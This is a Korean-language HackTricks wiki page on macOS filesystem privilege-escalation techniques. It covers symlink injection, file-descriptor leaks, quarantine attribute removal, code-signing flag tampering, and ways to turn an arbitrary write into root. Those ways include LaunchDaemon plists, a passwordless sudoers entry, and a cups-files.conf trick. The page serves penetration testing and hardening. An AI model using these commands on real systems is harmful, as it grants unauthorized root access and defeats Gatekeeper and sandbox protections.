# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX 권한 조합

**디렉터리**에서는 세 가지 권한 비트의 의미가 일반 파일에서와 다릅니다. `chmod(1)`는 디렉터리에 적용되는 실행 비트를 "**search**"라고 부릅니다:<sup>[[2]](#references)</sup>

> `0100` 파일에서는 소유자의 실행을 허용합니다. 디렉터리에서는 소유자가 디렉터리를 **탐색**할 수 있도록 허용합니다.

- **read** - 디렉터리 항목을 **열거**할 수 있습니다(이름 목록 확인).
- **write** - 디렉터리에서 항목을 **생성, 이름 변경 및 삭제**할 수 있습니다. 이는 파일이 아니라 *포함하는* 디렉터리의 속성입니다. 따라서 파일을 읽거나 쓸 수 없더라도 부모 디렉터리에 쓸 수 있으면 해당 파일을 삭제할 수 있습니다.
  - **하위 디렉터리**를 삭제하려면 먼저 비어 있어야 하며, 그러려면 내부 항목을 모두 제거할 수 있는 충분한 권한이 필요합니다.
  - 디렉터리에 **sticky bit**(`S_ISVTX`, 예: `/tmp`)가 설정되어 있으면 제한이 적용됩니다. POSIX에 따르면 이 경우 프로세스는 파일의 소유자이거나 디렉터리의 소유자이거나 적절한 권한을 가진 경우에만 해당 파일을 삭제하거나 이름을 변경할 수 있습니다.<sup>[[1]](#references)</sup>
- **execute / search** - 디렉터리를 **탐색**할 수 있습니다. 경로명 해석은 각 구성 요소를 "앞선 구성 요소가 지정한 디렉터리에서" 찾으므로, 경로 접두부의 구성 요소 하나에서라도 탐색 권한을 잃으면 리프 파일 자체가 모든 사용자에게 읽기 가능하더라도 경로를 통해 그 아래의 모든 항목에 접근할 수 없습니다.<sup>[[1]](#references)</sup>

### 위험한 조합

**root 소유의 파일/폴더를 덮어쓰는 방법**:

- 경로에 있는 부모 **디렉터리 소유자** 중 하나가 사용자
- 경로에 있는 부모 **디렉터리 소유자** 중 하나가 **쓰기 권한**이 있는 **users group**
- **users group**에 **파일**에 대한 **쓰기** 권한이 있음

위 조합 중 하나라도 있으면 공격자는 예상 경로에 **sym/hard link**를 **주입**해 권한이 필요한 임의 쓰기를 수행할 수 있습니다.

### Folder root R+X 특별 사례

이는 위에서 설명한 경로명 해석 규칙에서 바로 도출됩니다. **디렉터리에서 root에게만 R+X 권한이 부여**되어 있으면 다른 모든 사용자는 그 안의 파일에 *경로를 통해* 접근할 수 없습니다. 하지만 **파일 자체의 권한 비트는 여전히 느슨하게 설정되어 있을 수 있습니다**. 이를 가로막는 것은 디렉터리뿐입니다.

따라서 파일을 해당 **디렉터리 밖으로** 가져올 수 있는 primitive, 즉 공격자가 지정한 경로를 사용자가 탐색할 수 있는 위치로 **이동/이름 변경/복사**하는 권한 있는 프로세스가 있다면, 파일 자체의 mode를 우회하지 않고도 임의 읽기가 가능합니다:

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

권한이 낮은 사용자가 소스 경로를 지정할 수 있는 특권 파일 이동 도구(installer, log rotator, crash/diagnostic collector, backup 및 "export" 기능)를 찾아보세요.

## 심볼릭 링크 / 하드 링크

### 권한이 느슨한 파일/폴더

특권 프로세스가 권한이 낮은 사용자가 **제어할 수 있는** 파일이나 권한이 낮은 사용자가 **미리 생성했을 수 있는** 파일에 데이터를 쓰는 경우, 사용자는 심볼릭 링크나 하드 링크를 통해 해당 파일이 다른 파일을 **가리키도록** 만들 수 있습니다. 그러면 특권 프로세스가 그 파일에 데이터를 쓰게 됩니다.

공격자가 **임의 쓰기를 악용해 권한을 상승**시킬 수 있는 다른 섹션도 확인하세요.

### `O_NOFOLLOW`로 열기

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html)에 따르면: *"마스크에 `O_NOFOLLOW`를 사용하고 `open()`에 전달된 대상 파일이 심볼릭 링크라면 `open()`은 실패합니다."* **마지막** 구성 요소만 확인하며, 모든 **중간** 구성 요소는 계속 확인되고 따라갑니다. 따라서 `O_NOFOLLOW`로 쓰기를 "보호"한 개발자라도 대상 경로의 **상위 디렉터리**에 심볼릭 링크를 심으면 공격할 수 있습니다.<sup>[[3]](#references)</sup>

같은 man page에는 이 문제를 실제로 해결하는 플래그가 설명되어 있습니다.<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"전달된 경로의 구성 요소 중 하나라도 심볼릭 링크라면 `open()`은 실패합니다."*
- **`O_RESOLVE_BENEATH`** — *"지정된 경로 확인이 fd와 연결된 디렉터리 바깥으로 벗어나면 `openat()`은 실패합니다."*

그 외에는 이미 검증한 디렉터리 FD를 기준으로 `openat()`을 사용하거나, `realpath()`를 사용한 뒤 다시 검증해야 경로 중간의 심볼릭 링크 교체를 막을 수 있습니다.

## .fileloc

**`.fileloc`** 확장자를 가진 파일은 다른 애플리케이션이나 바이너리를 가리킬 수 있습니다. 따라서 해당 파일을 열면 그 애플리케이션/바이너리가 실행됩니다.\
예:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## 파일 디스크립터

### FD 누출 (`O_CLOEXEC` 없음)

`open` 호출에 `O_CLOEXEC` 플래그가 없으면 파일 디스크립터가 자식 프로세스에 상속됩니다. 따라서 권한이 높은 프로세스가 권한이 높은 파일을 열고 공격자가 제어하는 프로세스를 실행하면, 공격자는 **권한이 높은 파일의 FD를 상속**하게 됩니다.

대표적인 예는 **OS X 10.10의 `DYLD_PRINT_TO_FILE` LPE**입니다 ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld`는 해당 변수가 `processDyldEnvironmentVariable()` 외부에서 파싱되었기 때문에 **제한된(suid root) 바이너리에서도** `DYLD_PRINT_TO_FILE=/path`를 처리했습니다.
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`를 호출해 **임의의 경로에 root 소유 파일을 생성했습니다**.
- FD는 **닫히지 않았고 close-on-exec 플래그도 설정되지 않아**, suid 바이너리의 모든 자식 프로세스가 **root 소유 파일에 대한 쓰기 가능한 FD를 상속했습니다**.
- 예를 들어 `DYLD_PRINT_TO_FILE=/etc/target suid_binary`를 실행한 뒤 자식 프로세스에서 상속된 FD 번호를 읽으면 root 소유 파일에 임의로 쓸 수 있었습니다. `fcntl(fd, F_SETFL, 0)`로 `O_APPEND`를 해제해 덧붙이는 대신 덮어쓸 수도 있었습니다.

권한이 높은 프로세스가 사용자가 제어하는 무언가를 `exec`하기 **전에** 파일을 여는 경우에도 같은 형태로 취약점이 나타납니다(헬퍼 도구, `$EDITOR`를 통해 호출되는 `crontab` 스타일 편집기, 환경 변수 경로를 사용해 여는 로그/디버그 파일 등). 상속된 FD를 열거하려면 다음을 실행합니다:

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

`2`보다 큰 값이 본인이 직접 열 수 없는 파일을 가리킨다면 무엇이든 arbitrary-write(또는 arbitrary-read) primitive입니다.

## quarantine xattrs 트릭 피하기

### 제거하기

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### uchg / uchange / uimmutable 플래그

파일/폴더에 이 immutable 속성이 있으면 xattr를 설정할 수 없습니다.

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### xattr를 지원하지 않는 파일 시스템

macOS가 마운트할 수 있는 모든 파일 시스템이 **확장 속성**을 기본적으로 저장하는 것은 아닙니다. HFS+와 APFS는 지원하지만, **FAT32, exFAT 및 대부분의 NFS 마운트**는 지원하지 않습니다. macOS는 `._<filename>`이라는 이름의 **AppleDouble** 보조 파일을 기록해 이를 에뮬레이션합니다 ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

이는 quarantine에 중요합니다. xattr가 같은 볼륨에 실제로 기록되고 **다시 읽힐 수 있어야만** 유지되기 때문입니다:

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

볼륨을 나중에 `._` companion을 무시하는 경로에서 읽거나 companion이 제거/삭제되면, 파일은 **quarantine flag 없이** 도착합니다. quarantine되지 않은 `.app`이면 App Sandbox를 벗어나기에 충분합니다. 자세한 내용은 [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute)를 참조하세요.

### writeextattr ACL 및 AppleDouble quarantine 동작

`writeextattr` ACL 예시, `com.apple.acl.text` AppleDouble 메커니즘, sidecar 구성 및 검증 단계는 [AppleDouble/ACL quarantine bypass 재현](macos-appledouble-acl-quarantine-bypass.md)을 참조하세요.

## signature 검사 우회

### platform binaries 검사 우회

일부 보안 검사는 예를 들어 XPC service 연결을 허용하기 위해 바이너리가 **platform binary**인지 확인합니다. 그러나 https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ 에서 설명한 것처럼, `/bin/ls`와 같은 platform binary를 가져온 다음 환경 변수 `DYLD_INSERT_LIBRARIES`를 사용해 dyld를 통해 exploit을 주입하면 이 검사를 우회할 수 있습니다.<sup>[[7]](#references)</sup>

### `CS_REQUIRE_LV` 및 `CS_FORCED_LV` flag 우회

실행 중인 바이너리는 다음과 같은 코드를 사용해 자체 flag를 수정하여 검사를 우회할 수 있습니다.<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## Code Signature 우회

Bundle에는 bundle의 모든 파일에 대한 **hash**가 포함된 **`_CodeSignature/CodeResources`** 파일이 있습니다. CodeResources의 hash도 **executable**에 **embedded**되어 있으므로, 이것 역시 수정할 수 없습니다.

하지만 signature가 확인되지 않는 파일도 있습니다. plist에서 다음과 같이 `omit` 키가 지정된 파일입니다:

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

CLI에서 리소스의 서명을 계산할 수 있습니다:

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## dmgs 마운트

사용자는 기존 폴더 위에 사용자 지정 dmg를 마운트할 수도 있습니다. 다음은 사용자 지정 콘텐츠가 포함된 dmg 패키지를 만드는 방법입니다:

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

일반적으로 macOS는 `com.apple.DiskArbitrarion.diskarbitrariond` Mach service(`/usr/libexec/diskarbitrationd`에서 제공)를 통해 디스크를 마운트합니다. LaunchDaemons plist 파일에 `-d` 파라미터를 추가하고 재시작하면 `/var/log/diskarbitrationd.log`에 로그를 저장합니다.\
하지만 `hdik` 및 `hdiutil` 같은 도구를 사용해 `com.apple.driver.DiskImages` kext와 직접 통신할 수도 있습니다.

## 임의 쓰기

### 주기적 sh 스크립트

스크립트를 **shell script**로 해석할 수 있다면, 매일 실행되는 **`/etc/periodic/daily/999.local`** shell script를 덮어쓸 수 있습니다.

다음 명령으로 이 스크립트의 실행을 **위장**할 수 있습니다: **`sudo periodic daily`**

### Daemons

다음과 같은 plist로 임의의 스크립트를 실행하는 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** 같은 임의의 **LaunchDaemon**을 작성합니다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

`/Applications/Scripts/privesc.sh` 스크립트를 생성하고, root로 실행할 **명령어**를 작성하세요.

### Sudoers File

**arbitrary write** 권한이 있다면 **`/etc/sudoers.d/`** 폴더에 파일을 만들어 자신에게 **sudo** 권한을 부여할 수 있습니다.

### PATH 파일

**`/etc/paths`** 파일은 PATH 환경 변수를 설정하는 주요 위치 중 하나입니다. 이 파일을 덮어쓰려면 root 권한이 필요하지만, **privileged process**의 스크립트가 **전체 경로 없이** 어떤 **명령어**를 실행하는 경우, 이 파일을 수정해 해당 명령어를 **hijack**할 수 있습니다.

**`/etc/paths.d`**에 파일을 작성해 새 폴더를 **PATH** 환경 변수에 추가할 수도 있습니다.

### cups-files.conf

이 기법은 [이 writeup](https://www.kandji.io/blog/macos-audit-story-part1)에서 사용되었습니다.<sup>[[8]](#references)</sup>

다음 내용을 포함하는 `/etc/cups/cups-files.conf` 파일을 생성합니다:

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

이렇게 하면 권한이 777인 `/etc/sudoers.d/lpe` 파일이 생성됩니다. 끝에 추가한 불필요한 내용은 오류 로그를 생성하기 위한 것입니다.

그런 다음 `/etc/sudoers.d/lpe`에 `%staff ALL=(ALL) NOPASSWD:ALL`과 같이 권한을 상승시키는 데 필요한 설정을 작성합니다.

그런 다음 `/etc/cups/cups-files.conf` 파일을 다시 수정해 `LogFilePerm 700`을 지정하면, `cupsctl`을 호출할 때 새 sudoers 파일이 유효해집니다.

### Sandbox Escape

FS 임의 쓰기를 이용해 macOS sandbox에서 탈출할 수 있습니다. 예시는 [macOS Auto Start](../../../../macos-auto-start-locations.md) 페이지를 확인하세요. 흔히 쓰이는 방법은 시작 시 명령을 실행하는 Terminal 환경설정 파일을 `~/Library/Preferences/com.apple.Terminal.plist`에 작성한 다음 `open`으로 여는 것입니다.

## 다른 사용자로 쓰기 가능한 파일 생성

매우 흔한 privesc 기법은 **권한이 있는 프로세스가 내가 제어하는 디렉터리에 파일을 생성하게 한 다음**, 그 파일에 대한 **쓰기 권한을 유지하는 것**입니다. 이를 위해서는 두 가지가 필요합니다.

1. 내가 소유한 디렉터리(또는 **상속 가능한 ACL**을 설정할 수 있는 디렉터리). 디렉터리 안에 생성되는 파일이 내 권한을 상속받아야 합니다.
2. 파일을 생성할 **위치**를 지정할 수 있는 권한 있는/`suid` 프로세스. 일반적으로 디버그/로깅 환경 변수, 설정 파일 또는 helper의 XPC API를 통해 지정합니다.

**상속 가능한 ACL** 덕분에 생성된 파일이 다른 사용자의 소유여도 내가 쓸 수 있습니다. 상속 플래그 `file_inherit` / `directory_inherit`는 [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html)에 문서화되어 있습니다:<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

이제 권한이 있는 프로세스가 `$DIRNAME` 안에 생성하는 모든 파일을 **사용자가 쓸 수 있습니다**. 해당 디렉터리가 나중에 **root 권한으로 실행되는** 위치(`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, LaunchDaemon 디렉터리 등)이기도 하다면, 이는 곧바로 root 권한 상승으로 이어집니다. 파일을 확보한 뒤 무엇을 기록해야 하는지는 위의 [Sudoers File](#sudoers-file) 및 [cups-files.conf](#cups-filesconf) 섹션을 참조하세요.

"환경 변수가 root 프로세스로 하여금 파일을 생성하게 하고, FD가 사용자에게 누출되는" 전체 과정을 다룬 예제는 위의 [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec)를 참조하세요.

## POSIX Shared Memory

**POSIX shared memory**를 사용하면 POSIX 호환 운영 체제의 프로세스들이 공통 메모리 영역에 접근할 수 있어, 다른 프로세스 간 통신 방식보다 빠르게 통신할 수 있습니다. `shm_open()`으로 shared memory 객체를 생성하거나 열고, `ftruncate()`로 크기를 설정한 다음, `mmap()`을 사용해 프로세스의 주소 공간에 매핑합니다. 그러면 프로세스들이 이 메모리 영역을 직접 읽고 쓸 수 있습니다. 동시 접근을 관리하고 데이터 손상을 방지하기 위해 mutex나 semaphore 같은 동기화 메커니즘을 사용하는 경우가 많습니다. 마지막으로 프로세스는 `munmap()`과 `close()`로 shared memory의 매핑을 해제하고 닫으며, 필요에 따라 `shm_unlink()`로 메모리 객체를 제거합니다. 이 방식은 여러 프로세스가 공유 데이터에 빠르게 접근해야 하는 환경에서 효율적이고 빠른 IPC에 특히 효과적입니다.

<details>

<summary>Producer Code Example</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>소비자 코드 예제</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors**는 사용자 애플리케이션에서 **file descriptor operations**의 안전성과 신뢰성을 높이기 위해 macOS에 도입된 보안 기능입니다. 이러한 guarded descriptors를 사용하면 file descriptor에 특정 제한 또는 "guards"를 연결할 수 있으며, 이 제한은 커널에서 적용됩니다.

이 기능은 **unauthorized file access** 또는 **race conditions**와 같은 특정 유형의 보안 취약점을 방지하는 데 특히 유용합니다. 예를 들어, 한 스레드가 file description에 접근하여 **취약한 다른 스레드에도 접근 권한을 부여**하거나, 취약한 자식 프로세스가 file descriptor를 **상속**할 때 이러한 취약점이 발생할 수 있습니다. 이 기능과 관련된 함수는 다음과 같습니다.

- `guarded_open_np`: guard가 적용된 file descriptor를 엽니다
- `guarded_close_np`: file descriptor를 닫습니다
- `change_fdguard_np`: descriptor의 guard flags를 변경합니다(guard 보호를 제거할 수도 있음)

## References

- [1] [POSIX.1-2024 — 기본 정의, 4장 (파일 접근 권한, 디렉터리 보호, 경로명 해석)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE 로컬 권한 상승](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - 어떤 파일 시스템과 클라우드 서비스가 extended attributes를 보존하는가?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [7] [Mickey (Jhftss) - macOS Sandbox Escape의 새로운 시대](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Apple 취약점 분석: diskarbitrationd 및 storagekitd 감사 이야기 1부](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
